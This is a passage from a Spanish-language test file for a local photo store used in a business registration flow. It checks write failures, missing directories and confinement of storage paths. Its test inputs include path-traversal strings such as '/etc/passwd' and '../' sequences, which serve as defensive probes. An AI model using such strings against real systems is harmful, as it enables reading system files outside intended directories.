  it("un directorio sin permiso de escritura devuelve el literal de la spec, no una excepción", async () => {
    const bloqueado = path.join(temporal, "bloqueado");
    const almacen = crearAlmacenLocal(bloqueado);
    // Se crea con permisos de solo lectura: `mkdir -p` no falla (ya existe),
    // pero `writeFile` sí.
    await almacen.guardar(generarClaveFoto(), "ficha", Buffer.from("semilla"));
    await chmod(bloqueado, 0o500);

    try {
      const resultado = await procesarRegistro(
        formulario("7719998070", { foto: archivoDeFormulario(jpeg, "foto.jpg") }),
        contexto("203.0.113.91", almacen),
      );

      if (resultado.exito) throw new Error("sin poder escribir, el alta no debe declararse exitosa");
      expect(resultado.estado.errores.foto).toBe(MENSAJES_ERROR_FOTO.errorProcesamiento);
      // Y no quedó ficha a medias apuntando a una foto que no se escribió.
      expect(await prisma.negocio.count({ where: { whatsapp: "7719998070" } })).toBe(0);
    } finally {
      await chmod(bloqueado, 0o700);
    }
  });

  it("leer de un directorio ilegible responde 'no hay foto', no un error", async () => {
    const vacio = path.join(temporal, "vacio-total");
    const almacen = crearAlmacenLocal(vacio);
    await expect(almacen.leer(generarClaveFoto(), "ficha")).resolves.toBeNull();
    await expect(almacen.borrar(generarClaveFoto())).resolves.toBeUndefined();
  });

  it.each([
    ["ruta con ..", "../../.fotos-hostil"],
    ["solo espacios", "   "],
    ["cadena vacía", ""],
  ])("FOTOS_DIR %s: el directorio queda absoluto y ninguna clave escribe fuera de él", async (_caso, valor) => {
    const { directorioDeFotos: resolver } = await import("../src/lib/fotos/almacen");
    const resuelto = resolver({ FOTOS_DIR: valor });
    expect(path.isAbsolute(resuelto)).toBe(true);

    // Con el directorio ya resuelto, ninguna clave puede salirse de él: la
    // forma `[0-9a-f]{32}` no admite separadores y el almacén lo revalida.
    const almacen = crearAlmacenLocal(path.join(temporal, "confinado"));
    for (const hostil of ["../fuera", "..", "/etc/passwd", "a/b", "a\u0000b"]) {
      await expect(almacen.guardar(hostil, "ficha", Buffer.from("x"))).rejects.toThrow();
      await expect(almacen.leer(hostil, "ficha")).resolves.toBeNull();
      await expect(almacen.borrar(hostil)).resolves.toBeUndefined();
    }
  });

  it("el default de FOTOS_DIR nunca cae dentro de public/ ni del árbol servido", () => {
    const porDefecto = directorioDeFotos({});
    expect(path.isAbsolute(porDefecto)).toBe(true);
    expect(porDefecto).not.toContain(`${path.sep}public${path.sep}`);
    expect(path.basename(porDefecto)).toBe(".fotos");
  });
});
